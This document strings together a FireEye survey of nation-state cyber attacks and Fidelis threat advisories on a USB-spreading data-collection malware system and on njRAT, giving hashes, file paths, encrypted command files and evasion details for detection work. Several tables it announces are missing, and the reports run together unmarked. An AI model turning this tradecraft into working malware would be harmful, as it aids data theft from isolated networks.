In the Korean conflict , such incidents often take place on dates of historical significance , including July 4 , the U.S .
Independence Day .
Suspected North Korean attacks on U.S. institutions include U.S. military elements based in South Korea , the U.S .- based Committee for Human Rights in North Korea , and even the White House .
North Korean defectors have described a burgeoning cyberwarfare department of 3,000 personnel , largely trained in China and Russia .
The defectors stressed that North Korea has a growing fascinationwith cyber attacks as a cost - effective way to compete against its conventionally superior foes .
They believe that North Korea is growing increasingly comfortable and confident in this new warfare domain , assessing that the Internet is not only vulnerable to attack but that this strategy can create psychological pressure on the West .
Toward this end , North Korea has focused on disconnecting its important servers from the Internet , while building a dedicated `` attack network .
'' FireEye researchers have seen a heavy use of spear phishing and the construction of a `` watering hole , '' in which an important website is hacked in the hope of compromising the computers of its subsequent visitors , who usually belong to a certain VIP - profile the attacker is targeting .
Some North Korean attacks have begun to manipulate a victim 's operating system settings and disable their anti - virus software- techniques that are normally characteristic of Russian cybercriminals .
In other words , North Korean hackers may have learned from or have contracted support in Russia .
Apart from any possible disruption or destruction stemming from cyber attacks , computer network operations are an invaluable tool for collecting sensitive information , especially when it resides on government or think - tank networks normally inaccessible from the Internet .
North Korea , China , and Russia are all naturally interested in collecting cyber intelligence that would increase their comparative advantage in classified information , diplomatic negotiating positions , or future policy changes .
At the same time , North Korea also asserts that it is a target of cyber attacks from South Korea and the U.S .
In June 2013 , when the North suffered a two - day outage of all of its in - country websites , its state news agency denounced `` concentrated and persistent virus attacks , '' and proclaimed that the U.S. and South Korea `` will have to take the responsibility for the whole consequences .
'' The North noted that the attack took place in parallel with Key Resolve ( joint U.S .- South Korean military exercises ) , but the U.S. Joint Chiefs of Staff denied any connection .
A heavily fortified border separates India and Pakistan on the map .
But the quiet , borderless nature of cyberspace means both sides are free to engage in cyber warfare - even during peacetime .
In 2009 , India announced that Pakistani cybercriminals had placed malware on popular Indian music download sites as a clever , indirect way to compromise Indian systems .
In 2010 , the `` Pakistani Cyber Army '' defaced and subsequently shut down the website of the Central Bureau of Investigation , India 's top police agency .
In 2012 , over 100 Indian government websites were compromised .
Not to be outdone , in 2013 , cybercriminals in India undertook `` Operation Hangover , '' a large - scale Indian cyber espionage campaign that hit Pakistani IT , mining , automotive , legal , engineering , food service , military , and financial services networks .
Although researchers could not definitively tie the attacks to India 's government , many of the targets represented the country 's national security interests .
Since at least 2010 , many APTs ( likely China - based ) have targeted the governments , militaries , and businesses of ASEAN , the Southeast Asian geopolitical and economic group composed of Brunei , Burma ( Myanmar ) , Cambodia , Indonesia , Laos , Malaysia , Philippines , Singapore , Thailand , and Vietnam .
Although chances of any regional war erupting in the near term are low , a large volume of ongoing , regional cyber espionage activity is a constant .
Targeted industries include telecommunications , transportation , oil and gas , banks , and think tanks .
The usual motivation is to gain tactical or strategic advantage within the political , military , and economic domains .
FireEye researchers are following numerous APT actors in this region , including BeeBus , Mirage , Check Command , Taidoor , Seinup , and Naikon .
Their most common tactic is spear phishing , often using legitimate decoy documents that are related to the target 's national economy or politics , or to regional events such as ASEAN summits , Asia - Pacific Economic Cooperation ( APEC ) summits , energy exploration , or military affairs .
FireEye believes that many of these regional economic organizations are attractive targets for APT campaigns because the information they possess is valuable and their level of cyber security awareness is low .
Often , these organizations have inconsistent system administration , infrequent software patch management , poor policy control , or some combination of these issues .
Thus , many of these networks are `` low - hanging fruit '' for attackers .
And to make matters worse , compromised systems are used as staging grounds for further attacks on regional targets , by installing illicit command - and - control ( CnC ) servers , abusing legitimate email accounts , and disseminating stolen office documents as `` bait .
'' In 1939 , Winston Churchill declared that Russia was a `` riddle wrapped in a mystery inside an enigma … '' .
Seven decades later , cyber defense researchers would say that not much has changed .
Compared with the constant attacks detected from China , you can almost hear the snow falling on Red Square .
One of the outstanding questions in cyber security today is : Where are the Russians ? Perhaps they are simply great hackers .
Maybe they have sufficient human intelligence .
Whatever the reason , cyber defense analysts often look in vain for the traces of Russian cybercriminals .
As a step toward finding some answers , however , consider the second half of Churchill 's quote : `` … but perhaps there is a key- that key is Russian national interest .
'' In other words , where there is smoke , there is usually fire .
In the mid-1990s , at the very dawn of the World Wide Web , Russia was engaged in a protracted struggle over the fate of Chechnya ; the Chechens became pioneers in cyber propaganda , and the Russians became pioneers is shutting down their websites .
In 1998 , when Russian ally Serbia was under attack from NATO , pro - Serbian hackers jumped in the fray , targeting NATO with DoS attacks and at least twenty - five strains of virus - infected email .
In 2007 , Russia was the prime suspect in the most famous international cyber attack to date - the punitive DDoS on Estonia for moving a Soviet - era statue .
In 2008 , researchers uncovered clear evidence that computer network operations played a supporting role in Russian military advances during its invasion of Georgia .
Also in 2008 , Russia was suspected in what U.S. Deputy Secretary of Defense William Lynn called the `` most significant breach of U.S. military computers ever '' -an attack on Central Command ( CENTCOM ) , delivered through an infected USB drive .
In 2009 , Russian cybercriminals were blamed in `` Climategate , '' a breach of university research intended to undermine international negotiations on climate change mitigation .
In 2010 , NATO and the European Union warned of increased Russian cyber attacks , while the FBI arrested and deported a possible Russian intelligence agent named Alexey Karetnikov , who had been working as a software tester at Microsoft .
One ironic aspect of nation - state cyber attacks - especially in authoritarian countries - is that many of them are inward facing .
In 2012 , Russian security firm Kaspersky Lab announced the discovery of '' Red October , '' a cyber attack campaign that spied on millions of citizens around the world , but chiefly within the former Soviet Union .
Targets included embassies , research firms , military bases , energy providers , nuclear agencies , and critical infrastructure .
Similarly , in 2013 , researchers found malware on millions of Android devices in Russia and in Russian - speaking countries .
Either or both of these attacks could be partially explained as the Russian government keeping an eye on its own population , and that of neighboring countries .
On the brighter side , as a step toward cyber détente , the U.S. and Russia in 2013 signed an agreement to build a cyber `` hotline '' -similar to that used for nuclear scares during the Cold War - to help defuse any computer - related crises in the future .
But , just to be on the safe side , Russia is taking the extreme cyber defense measure of buying old - fashioned typewriters , and the Russian military is ( like the U.S. , China , and Israel ) creating cyber warfare - focused units .
Though relatively quiet , Russia appears to be home to many of the most complex and advanced cyber attacks FireEye researchers have seen .
More specifically , Russian exploit code can be significantly stealthier than its Chinese counterpart - which can also make it more worrisome .
The `` Red October '' campaign , including its satellite software dubbed `` Sputnik , '' is a prominent example of likely Russian malware .
TTP often includes the delivery of weaponized email attachments , though Russian cybercriminals appear to be adept at changing their attack patterns , exploits , and data exfiltration methods to evade detection .
In fact , one telltale aspect of Russian hackers seems to be that , unlike the Chinese , they go to extraordinary lengths to hide their identities and objectives .
FireEye analysts have even seen examples in which they have run `` false - flag '' cyber operations , designing their attack to appear as if it came from Asia .
One further problem for cyber defense researchers is that some Russian back doors into compromised systems are hard to distinguish from advanced cybercriminal break - ins .
As a region , the Middle East may not possess the arsenal of zero - day exploits available in Russia , or the brute - force numbers of China .
Therefore , some Middle Eastern hackers may have to rely on cyber tactics that emphasize novelty , creativity , and deception .
For example , the 2012 Mahdi campaign , which infected targets in the Middle East , used malicious Word documents , PowerPoint files , and PDFs to infect targets .
That approach is similar to many other attackers .
But these attacks were accompanied by some imaginative elements such as games , attractive images , and custom animations specifically designed to aid in the attack .
Not only did they trick users into executing commands to install malicious code , but they also distracted users from seeing malware - related warning messages .
Furthermore , Mahdi attacks were tailored to specific target audiences - for example by offering variations of games unique to each organization .
Such pinpoint strikes rely on prior reconnaissance , help to evade cyber defense behavioral - detection mechanisms , and dramatically increase the odds of compromise .
So in the Middle East , the relative sophistication of an attack may be calculated less in the technology , and more in the clever ways in which malware is delivered and installed on a target network .
Wherever significant activity erupts in the real world ( including crime , espionage , and warfare ) , parallel activity unfolds in cyberspace .
It is therefore unsurprising that Iran - which has tense international relations and is on the verge of acquiring a nuclear bomb - has also experienced the most sophisticated cyber attacks to date .
In 2010 , Stuxnet was a `` cyber missile '' of sorts designed with painstaking precision to burrow deep into Iran 's nuclear program and destroy physical infrastructure .
To some degree , this piece of software replaced a squadron of fighter aircraft that would have violated foreign airspace , dropped laser- guided bombs , and left a smoking crater in the Earth 's surface .
Beyond Stuxnet , other advanced espionage attacks have worried security experts , including Duqu , Flame , and Gauss , which all may have come from the same threat actor .
And even amateurs are successfully targeting Iran ; although the `` Mahdi '' malware is by comparison far less sophisticated than Stuxnet and its cousins , Mahdi has still managed to compromise engineering firms , government agencies , financial services firms , and academia throughout the Middle East .
So how does anyone , including a nation - state , respond to a cyber attack ? Does the counterstrike remain within the cyber realm , or can it come in the form of a traditional military ( or terrorist ) assault ? In 2012 , Iran appears to have chosen the first option .
A hacker group called the `` Cutting Sword of Justice '' used the `` Shamoon '' virus to attack the Saudi Arabian national oil company Aramco , deleting data on three - quarters of Aramco 's corporate PCs ( including documents , spreadsheets , e - mails , and files ) and replacing them with an image of a burning American flag .
And over the past year , another group called Izz ad - Din al - Qassam launched `` Operation Ababil , '' a series of DDoS attacks against many U.S. financial institutions including the New York Stock Exchange .
Other examples of cyber attacks abound .
In 2009 , the plans for a new U.S. Marine Corps 1 presidential helicopter were found on a file - sharing network in Iran .
In 2010 , the `` Iranian Cyber Army '' disrupted Twitter and the Chinese search engine Baidu , redirecting users to Iranian political messages .
In 2011 , Iranian attackers compromised a Dutch digital certificate authority , after which it issued more than 500 fraudulent certificates for major companies and government agencies .
In 2012 , Iran disrupted the BBC 's Persian Language Service , and University of Toronto researchers reported that some versions of the Simurgh `` proxy '' software ( which is popular in countries like Iran and anonymizes Internet traffic ) also installed a Trojan that collected usernames and keystrokes , sending them to a likely intelligence collection site .
Finally , in 2013 the Wall Street Journal reported that Iranian actors had increased their efforts to compromise U.S. critical infrastructure .
Syria is in the midst of a civil war , so researchers have a lot of cyber activity to analyze .
The most prominent hacker group by far is the Syrian Electronic Army ( SEA ) , which is loyal to Syrian President Bashar al - Assad .
SEA has conducted DDoS attacks , phishing , pro - Assad defacements , and spamming campaigns against governments , online services , and media that are perceived to be hostile to the Syrian government .
SEA has hacked Al - Jazeera , Anonymous , Associated Press ( AP ) , BBC , Daily Telegraph , Financial Times , Guardian , Human Rights Watch , National Public Radio , The New York Times , Twitter , and more .
Its most famous exploit was a hoax announcement using AP 's Twitter account that the White House was bombed and President Obama injured - after which stock markets briefly dipped to the tune of $ 200 billion .
In the month of July 2013 alone , SEA compromised three widely used online communications websites : Truecaller ( the world 's largest telephone directory ) , Tango ( a video and text messaging service ) , and Viber ( a free online calling and messaging application ) .
These types of compromises are significant because they can give Syrian intelligence access to the communications of millions of people , including political activists within Syria who might then be targeted for espionage , intimidation , and arrest .
To compromise its targets , the SEA often sends socially engineered , spear - phishing emails to lure opposition activists into opening fraudulent , weaponized , and malicious documents .
If the recipient falls for the scam , Trojan horse , remote access tool ( RAT ) software is installed on the victim 's computer that can give the attacker keystrokes , screenshots , microphone and webcam recordings , stolen documents , and passwords .
And of course , the SEA likely sends all of this information to a computer address lying within Syrian government - controlled Internet Protocol ( IP ) space for intelligence collection and review .
Even during the Cold War , the Arab - Israeli conflict saw many hot wars , and it was often the testing ground for new military weapons and tactics .
Nothing has changed in the Internet era .
Since at least 2000 , pro - Israeli hackers have targeted sites of political and military significance in the Middle East .
In 2007 , Israel reportedly disrupted Syrian air defense networks via cyber attack ( with some collateral damage to its own domestic networks ) to facilitate the Israeli Air Force 's destruction of an alleged Syrian nuclear facility .
But as an advanced industrial nation , Israel also depends on information technology .
The nation has proven to be vulnerable to cyber attacks , which often target the Israeli economy .
In 2009 , during Israel 's military operation in Gaza , hackers briefly paralyzed many government sites with a DDoS attack from at least 500,000 computers .
The 2009 attack consisted of four independent waves , each stronger than the last , peaking at 15 million junk mail deliveries per second .
The Israeli `` Home Front Command '' website , which plays a key role in national defense communications with the public , was down for three hours .
Due to technical similarities with the 2008 cyber attack on Georgia during its war with Russia , Israeli officials surmised that the attack itself might have been carried out by a criminal organization in the former Soviet Union , and paid for by Hamas or Hezbollah .
Often , the trouble with cyber attacks is that they do not need to be highly sophisticated to succeed , even against security - conscious Israel .
In 2012 , the ineptly written `` Mahdi '' malware compromised at least 54 targets in Israel .
Last but not least , in 2013 , the Iranian media reported that the Syrian army had carried out a cyber attack against the water supply of the Israeli city of Haifa .
Prof . Isaac Ben - Israel , a cyber security adviser to Prime Minister Benjamin Netanyahu , said that the report was false , but added that cyber attacks on critical infrastructures pose a `` real and present threat '' to Israel .
Analysts believe that the U.S. has conducted the most highly engineered cyber attacks to date , including Stuxnet , Duqu , Flame , and Gauss .
This family of malware is unparalleled in its complexity and targeting .
Stuxnet in particular was developed with a singular goal ( to disrupt Iranian nuclear enrichment ) that was both narrowly focused and capable of yielding strategic gains in the international arena .
In contrast to computer worms such as Slammer and Code Red , Stuxnet did not seek to compromise as many computers as possible , but as few as possible .
Even more amazing , its malicious behavior was concealed under a veneer of apparently legitimate operational data - but ultimately , the malware destroyed Iranian centrifuges .
This family of malware was exquisitely designed .
For example , its payload can arrive at its destination encrypted - and become decrypted and installed only on a target device .
This helps the malware to evade the prying eyes of cyber defenders , making discovering and reverse engineering the malware much more difficult .
Ironically , this family of malware could be a paragon of over - engineering .
For example , it not only uses multiple zero - day exploits , but also world - first computational achievements such as a forced cryptographic `` hash collision .
'' In the case of Iran ( which is currently subject to a trade embargo that restricts its acquisition of high technology ) , it is doubtful whether Iranian software is up - to - date or properly configured .
So the authors of Stuxnet could likely have used more conventional computer exploits and still succeeded .
One possible telling aspect of U.S. cyber attacks : they require such a high level of financial investment , technical sophistication , and legal oversight that they will stand out from the crowd .
On the last point , Richard Clarke , who served three U.S. Presidents as a senior counterterrorism official , argued that Stuxnet was a U.S. operation because `` it very much had the feel to it of having been written by or governed by a team of Washington lawyers .
'' Finally , the amount of work involved in these operations suggests the participation of an enormous defense contractor base , with different companies specializing in particular aspects of a large and complex undertaking .
On the downside ( and similar to the Israeli case ) , all advanced industrial economies are vulnerable to cyber counterattack .
In 2008 , a CIA official informed a conference of critical infrastructure providers that unknown cybercriminals , on multiple occasions , had been able to disrupt the power supply in various foreign cities .
In the military domain , Iraqi insurgents used $ 26 off - the - shelf software to intercept live video feeds from U.S .
Predator drones , likely giving them the ability to monitor and evade U.S. military operations .
In the economic sphere , the U.S .- based International Monetary Fund ( IMF ) fell victim to a phishing attack in 2011 that was described as a `` very major breach .
'' Thus , while cyber attacks are relatively a new phenomenon , they represent a growing national security challenge .
As part of a broader effort to mitigate the threat , President Obama signed a directive in 2013 that the U.S. should aid allies who come under foreign cyber attack .
No prominent examples have been discovered of the European Union ( EU ) or the North Atlantic Treaty Organization ( NATO ) conducting their own offensive cyber attacks .
On the contrary , their leaders have so far foresworn them .
But many examples reveal European networks getting hacked from other parts of the world , particularly China and Russia .
Within government , cyber attacks on the British Foreign Ministry evaded network defenses in 2010 by pretending to come from the White House .
In 2011 , German Police found that servers used to locate serious criminals and terrorism suspects had been penetrated , initially via a phishing attack .
Also in 2011 , European Commission officials were targeted at an Internet Governance Forum ( IGF ) in Azerbaijan .
In the military sphere , in 2009 , French Navy planes were grounded following an infection by the Conficker worm .
In 2012 , the UK admitted that cybercriminals had penetrated its classified Ministry of Defense networks .
In business , the European Union 's carbon trading market was breached in 2011 , resulting in the theft of more than $ 7 million in credits , forcing the market to shut down temporarily .
In 2012 , the European Aeronautic Defence and Space Company ( EADS ) and German steelmaker ThyssenKrupp fell victim to major attacks by Chinese cybercriminals .
Security professionals should particularly be on the lookout for APT cyber threats just before and during international negotiations .
In 2011 alone , the European Commission complained of widespread hacking before an EU summit , the French government was compromised prior to a G-20 meeting , and at least 10 Norwegian defense and energy companies were breached during large - scale contract negotiations , via phishing that was specifically tailored to each company .
World War Z told a story of idiosyncratic national behavior in response to a major international crisis .
This report sought to highlight the same phenomenon in regard to the challenges posed by national cyber insecurity and international cyber attacks .
Behind every incident is an agenda - and individual human beings - each unique and ultimately identifiable .
The bigger the cyber campaign , the more data it generates for security researchers , and the more difficulty attackers will have remaining anonymous and hiding their agenda .
As for crystal balls : no one knows what the next cyber attack will look like .
But considering recent trends , we can make a few educated guesses .
Here are five factors that could change the world 's cyber security landscape in the near- to medium - term : 1 .
Outage of national critical infrastructure : we know that cyber attacks can disrupt government networks , but most current cases simply do not rise to the level of a national security threat .
Stuxnet- and Iran 's alleged retaliation against Saudi Aramco - has shifted the thinking on cyber war from theory to something closer to reality .
But have we seen the limit of what cyber attacks can achieve , or could cybercriminals threaten public safety by downing a power grid or financial market ? 2 .
Cyber arms treaty : if world leaders begin to view cyber attacks as more of a liability than an opportunity , they may join a cyber arms control regime or sign a non - aggression pact for cyberspace .
However , arms control requires the ability to inspect for a prohibited item .
President Reagan 's favorite Russian proverb was доверяй , но проверяй , or `` trust but verify .
'' Given that a single USB stick can now hold billions of bits of information , verifying would be easier said than done .
3 .
PRISM , freedom of speech , and privacy : we are still at the dawn of the Internet era , and this conversation has only just begun .
It encompasses Daniel Ellsberg , Chelsea Manning , and Edward Snowden , as well as the Declaration of Independence , Enigma , and The Onion Router ( TOR ) .
Today , politicians , spooks , and hippies are all aware of a critical debate on the horizon - just how much online privacy should we have ? 4 .
New actors on the cyber stage : the revolutionary nature of computers and the amplification power of networks are not exclusive to the world 's largest nations .
Iran , Syria , North Korea , and even non- state actors such as Anonymous have employed cyber attacks as a way to conduct diplomacy and wage war by other means .
Researchers have little reason to think that other governments are not active in this domain .
Possible candidates could be : a. Poland : it was the Poles who first broke the German Enigma cipher - way back in 1932 ! Today , with programming talent and well - known rivalry with Russia , it is a possibility .
b. Brazil : Home to some of the world 's most prolific cybercriminals , will Brazil 's government , be angry about recent revelations of U.S. cyber spying , harness this talent for geopolitical ends ? c. Taiwan : with constant cyber attacks emanating from Mainland China , Taipei may have little choice but to react .
5 .
Stronger focus on evasion : as we have seen , some nation - states know how to launch stealthy cyber attacks .
But as the discipline of cyber defense matures , and as public awareness of the World War C phenomenon grows , some `` noisy '' cyber attackers such as China may be forced to raise their game by trying to fly under a more finely tuned radar .
The analysis and conclusions drawn in this paper are conjectural .
Cyber security , cyber espionage , and cyber war are new and rapidly evolving concepts .
Furthermore , most computer network operations are shrouded in secrecy .
Deception is a given .
`` A cyber attack , viewed outside of its geopolitical context , allows very little legal maneuvering room for the defending state , '' said Prof . Thomas Wingfield of the Marshall Center , in a recent email interview with FireEye .
`` False flag operations and the very nature of the Internet make tactical attribution a losing game .
'' But Wingfield adds that strategic attribution - fusing all sources of intelligence on a potential threat- allows a much higher level of confidence and more options for government decision makers .
`` And strategic attribution begins and ends with geopolitical analysis , '' he said .
With this in mind , we hope that an awareness of this World War C dynamic helps cyber security professionals better understand , identify , and combat cyber attacks in the future .
FireEye has invented a purpose - built , virtual machine - based security platform that provides real - time threat protection to enterprises and governments worldwide against the next generation of cyber attacks .
These highly sophisticated cyber attacks easily circumvent traditional signature - based defenses , such as next - generation firewalls , IPS , anti - virus , and gateways .
The FireEye Threat Prevention Platform provides real - time , dynamic threat protection without the use of signatures to protect an organization across the primary threat vectors , including Web , email , and files and across the different stages of an attack life cycle .
The core of the FireEye platform is a virtual execution engine , complemented by dynamic threat intelligence , to identify and block cyber attacks in real time .
FireEye has over 1,100 customers across more than 40 countries , including over 100 of the Fortune 500 .
The General Dynamics Fidelis Cybersecurity forensics team analyzed several related malware samples that together provide a sophisticated mechanism to gather data from individual computer systems .
The malware appears to be part of a system that may be optimized for use by an insider agent and/or for collecting data from disparate networks or air-­‐gapped systems .
The malware includes features to clean up after itself by deleting key indicators that it was present .
The malware system apparently includes additional components that have not been identified .
These components would potentially perform additional command and control functions and potentially exfiltration from the central host .
The sophistication of the malware and the effort involved in its development would indicate that it was developed for a high value target .
However , the specific targeting of this malware is not clear at this time .
We are concerned that while the malware system was probably developed for a specific target or family of targets , it could be employed with little adaptation against virtually any target .
This threat advisory describes the functionality of the three malware files to include command inputs and the resulting behavior of the malware .
The Fidelis XPS™ advanced threat defense system has been updated with rules to detect various components of this malware system .
However , the fact there are still unanswered questions about the components of the malware system and its intended targeting , emphasizes the importance of employing that best practices such as denying use of removable media on sensitive systems and disabling autorun ! This is particularly true for systems that are not protected by Fidelis XPS .
Additional reverse engineering and analysis is on-­going at this time .
On 8 Jan 2014 , The Fidelis Network Defense and Forensics team received three files : netsat.exe , netui3.dll and winmgt.dll .
All three files were 32 bit executable files .
Preliminary analysis disclosed netsat.exe would terminate when run if the system date was on or after 21 Jun 2013 .
The submitted files appeared to represent two parts of a suspected data collection scheme .
Essentially , netsat.exe appeared to operate as a master program that infected removable media connected to the system whereon it was running and collected data from infected drives when the drives returned .
netsat.exe received commands from an encrypted file stored on the local system .
The infection was in the form of a renamed netui3.dll or winmgt.dll file along with an Autorun.inf file set to run the renamed netui3.dll/winmgt.dll when the infected drive was connected to a target host .
There could be many iterations of netsat.exe running on enterprise or targeted entity systems .
Based on available analysis results , netsat.exe could collect surreptitiously gathered data from any infected drive connected to the system whereon netsat.exe was running , e.g. , the infected drive would not have to be processed by the same system whereon it became infected .
Data , in the form of files , destined for exfiltration may be obfuscated via a custom XOR operation .
The gathered data would ostensibly be exfiltrated via other means .
Some components of the malware 's behavior are possibly remarkable .
Quickly considering these results in cursory questions reflected as follows : • Command and Control ( C2 ) appears to be accomplished via providing commands in an encrypted file stored on the local ' master ' system ( re : netsat.exe ) .
This C2 scheme would seem to dictate : o Intruder remote access to the ' master ' system o Intruder local access to the ' master ' system o a C2 delivery / retrieval component , such as another piece of code that downloads a C2 file • Available information precludes determination of the means of exfiltration .
netsat.exe's data collection functionality suggested data destined for exfiltration might be collected by the ' master ' system .
This possibility suggests : o Intruder remote access to the ' master ' system o Intruder local access to the ' master ' system o An exfiltration mechanism in the form of another piece of code Scanning with several select third party malware detection applications resulted in zero detections .
Cursory online research disclosed a file named netui3.dll was possibly submitted to VirSCAN.org on or before 2 Dec 2013 .
The name netui3.dll appears to have been used for malware in the past and was likely associated with a backdoor .
The name may be a play on the name netui2.dll , a legitimate Windows file name .
All three submitted files compared the system date and time to hard coded dates upon execution .
If the system date was after the hard coded dates , the malware would delete itself and terminate .
The following table illustrates the hard coded dates in relation to the affected files ' PE dates : The following version information was recorded in the netsat.exe executable : The Language / Code Page code 1033 denotes U.S. English .
This versioning information appears contrived .
However , it looks convincing enough to pass cursory inspection , i.e. , the format appears legitimate and the appearance does not engender suspicion .
Cursory online searches failed to disclose what , if anything Cdto might be associated with .
Scanning disclosed the file contained a function possibly associated with TEAN encryption .
This appeared to indicate TEA ( Tiny Encryption Algorithm ) involvement .
( Note : The encryption is used to encrypt commands stored in a file on the local system .
) The submitted files named netui3.dll and winmgt.dll did not have embedded versioning Information like netsat.exe did .
The presence of the following files may indicate netsat.exe , et al , involvement : The presence of the following , specifically on removable media , may indicate netsat.exe , et al , involvement : Cursory analysis did not disclose entrenchment data , such as a Registry entry to ensure persistence .
This cursory analysis disclosed no network artifacts specific to the malware 's operation .
However , evidence of any of the files involved ( MD5 , strings , file names ) traversing the network , e.g. , on the move , may be indicative of netsat.exe , et al presence .
Given what was revealed during this cursory analysis , finding string and or hash artifacts in SMB traffic seemed the most likely possibility with regard to network detection .
netsat.exe The following interesting strings were noted in the raw netsat.exe file : The following interesting strings were noted in the raw netui3.dll file : The following interesting strings were noted in the raw winmgt.dll file : Based on netsat.exe manipulating a file named netui3.dll , the submitted netsat.exe and netui3.dll appeared associated .
Versioning is possible .
For example , the submitted netui3.dll sample may not match the submitted netsat.exe sample in terms of versioning .
However , analysis assumed , for the sake of efficiency , that the submitted netui3.dll and submitted netsat.exe file were associated .
The submitted winmgt.dll file appeared very similar to netui3.dll .
However , some differences suggested the two files represented disparate versions .
Analysis disclosed date sensitivity built into the submitted files .
If the sample was run after a particular date , it would effectively terminate and delete itself : Analysis disclosed netsat.exe probably serves as the headquarters of malicious activity by : Analysis disclosed netui3.dll/winmgt.dll probably serve as the field units of malicious activity by : The following commands and their descriptions , listed by executable file , illustrate the submitted malware 's functionality : This advisory is based on preliminary information .
It is important to note that reverse engineering and analysis of the malware system is still underway .
We expect to provide additional data , and some of this information may change as a result of continued research .
However , due to the unique functionality of malware system and its potential for employment against targets beyond the initially intended victim , the network security community should be concerned and track this malware closely .
In June 2013 , we released a paper containing information about the njRAT malware that included its functionality , indicators of compromise , and campaign codes used on the variants we had identified .
( http : //www.fidelissecurity.com / threatadvisory ) .
To this day , we continue to observe waves of blunt phishing attacks from compromised hosts in the Middle East , showing threat actors using multiple tools ( including njRAT , AdwindRAT , Xtreme RAT , and H - Worm ) in clustered phishing attacks against the same targets .
Some of these attacks continue to target the U.S. telecommunications sector with threat actors sending phishing emails using business - oriented lures containing the aforementioned tools or links to websites that serve these tools .
Additionally , we continue to directly observe significant activity from threat actors sending commands to the victim systems in the Middle East .
Further , we are observing attackers using the following obfuscators to make detection of this malware specimen more difficult for security analysts : -­‐ .NetShrink
( http : //www.pelock.com / products / netshrink ) -­‐ Confuser v1.9.0.0 ( http : //confuser.codeplex.com/ ) -­‐ .NET
Reactor ( http : //www.eziriz.com/ ) This document provides details of the njRAT campaign codes used , versions , ports , and CnC nodes currently observed sending commands to victim systems .
It 's also clear that threat actors are actively using the following version of njRAT : 0.3.6 , 0.4.1a , 0.5.0E , 0.6.4 .
`` njRAT '' is a robust remote access trojan ( RAT ) which upon reaching and infecting an end - point , allows the attacker to have full control over the victim system .
Among other things , with this access , the attacker could start scanning other systems in the victim network to perform lateral movement .
The following table contains information about the observed CnC nodes , ports , campaign codes , and njRAT versions : It 's clear from this paper that there continues to be considerable global activity involving threat actors using njRAT and associated tools .
We 're publishing these indicators so that others in the security research community can monitor for this activity and potentially correlate against other campaigns and tools that are being investigated .
Fidelis XPS™ detects all of the activity documented in this paper .
The Fidelis Threat Research Team will continue to actively monitor the ever - evolving threat landscape for the latest threats to our customers ' security .
Previous General Dynamics Fidelis Cybersecurity Services ( Fidelis ) reporting , ref : Fidelis Threat Advisory ( FTA ) # 1011 dated 15 Jan 2014 , introduced a malware system comprised of multiple files that provided a means for intruders to discover and retrieve data from disparate computer systems via removable storage devices .
The malware system consists of at least two Portable Executable ( PE ) files , one acting as a headquarters component and one acting as field unit or agent component .
The headquarters component infects drives connected to its host system with the field unit component and retrieves data from the field unit on the infected drive 's return to the headquarters host system .
The field unit conducts reconnaissance and data collection in accordance with particular commands .
Continuing analysis solidified the headquarters component 's Command and Control ( C2 ) scheme .
The malware receives commands from a locally stored encrypted file .
This report describes select malware functionality with some granularity , provides extended detail regarding the headquarters component 's C2 functionality , provides additional means of defensive detection of this malware and describes some interesting aspects of the malware as a whole .
TM The Fidelis team updated Fidelis XPS advanced threat defense system with additional rules to reflect current analysis findings associated with this malware .
Previous reporting , ref : Fidelis Threat Advisory ( FTA ) # 1011 dated 15 Jan 2014 , introduced a malware system comprised of multiple files that reflected a means for intruders to discover and retrieve data from disparate computer systems via removable storage devices .
Analysis of the system relied on the availability of two files named netsat.exe and netui3.dll .
Netsat.exe functioned as a master application affording intruders the ability , in a selective and controlled manner , to infest removable devices with an agent application in the form of netui3.dll , aka setup35.exe , aka update.exe .
Previous reporting likened netsat.exe as a headquarters application and netui3.dll as a field unit with the following basic functionality : The following graphic serves to illustrate a possible basic theory of operation given available data : File Name : netui3.dll File Size : 39424 bytes MD5 : 68aed7b1f171b928913780d5b21f7617 Continued analysis disclosed details regarding the field unit / agent application .
The following reflects observations during field unit execution from an infected external drive : File Name : netsat.exe File Size : 43520 bytes MD5 : eb8399483b55f416e48a320d68597d72 Previous analysis results indicated netsat.exe retrieved commands from an encrypted file named netwn.drv resident in the CSIDL_WINDOWS\msagent\ directory .
The encryption was a Tiny Encryption Algorithm ( TEA ) implementation that used a key that was modified during encryption and decryption operations .
The following command file hex editor excerpt illustrates the command file 's obfuscation in a contrived instance : Analysis efforts did not have access to ' command ' files retrieved from the victim systems for either the headquarters or the field unit applications .
However , using the malware 's behavior and determining the command file 's format via reverse engineering afforded the ability to test numerous assumptions about the malware 's intended use .
Analysis determined the command format was : drive identification followed by one or more command and parameter strings .
The following table reflects testing and theoretical contents of command files driving netsat.exe operation : The Following Are Hypothetical Scenarios Designed to Illustrate Possible Employment Options Possible Commands One -­ Targeting Specific Devices ( Known to Intruder From Previous netsat / netui3 Activity ) Possible Commands Two -­ Maximizing Propagation ( Theoretical ) The headquarters component ( netsat.exe ) logs certain events in a file located at CSIDL_MYPICTURES\wins .
Analysis indicates the log file is probably stored in the clear , i.e. , the contents are not obfuscated .
Example log file contents are presented as follows : The following strings , which are not all inclusive or exclusive , could be used to find log files , fragments or contents on devices and on a network : Previous and continuing analysis results indicated some interesting and/or relevant aspects of this malware : The following interesting questions / assumptions emerged from previous cursory analysis of this malware : Further analysis confirms the malware 's use of an encrypted file stored on the system whereon the malware is executing without an apparent means of automatic generation .
This continues to suggest that intruders either have local or remote access to headquarters systems running netsat.exe or access to another application that automates remote C2 data / file retrieval .
Intruders ' apparent ability to distinguish between particular field unit vehicles ( infected drives ) , ref : Possible Commands One -­ Targeting Specific Devices ( Known to Intruder From Previous netsat / netui3 Activity ) from Hypothetical command table , suggests active engagement with the malware and targets .
This report is based on information extracted from reverse engineering and analysis of two PE files .
There are other components and artifacts of this malware that are currently inaccessible to Fidelis analysts .
Therefore , analysts extrapolated some of the behavior presented here .
While analysts are confident about behaviors described to date , there could certainly be additional behaviors and nuances heretofore unseen .
Analysis of this malware continues to suggest that a sophisticated effort was behind its creation and employment .
Actors went to great lengths to make the malware efficient and effective while building in obfuscation and complexity .
Interesting artifacts and observations continue to be discovered and made , such as the malware 's apparent expiration , the interesting naming convention for a directory to hold collected data , and the actors ' apparent intention to avoid certain networks or network addressing schemes .
Analysis continues and any relevant additional information will be reported as soon as practicable .
In the past thirty days ( 30 ) an increase attack activity has been observed using the `` njRAT '' malware .
This remote access trojan ( RAT ) has capabilities to log keystrokes , access the victim 's camera , steal credentials stored in browsers , open a reverse shell , upload / download files , view the victim 's desktop , perform process , file , and registry manipulations , and capabilities to let the attacker update , uninstall , restart , close , disconnect the RAT and rename its campaign ID .
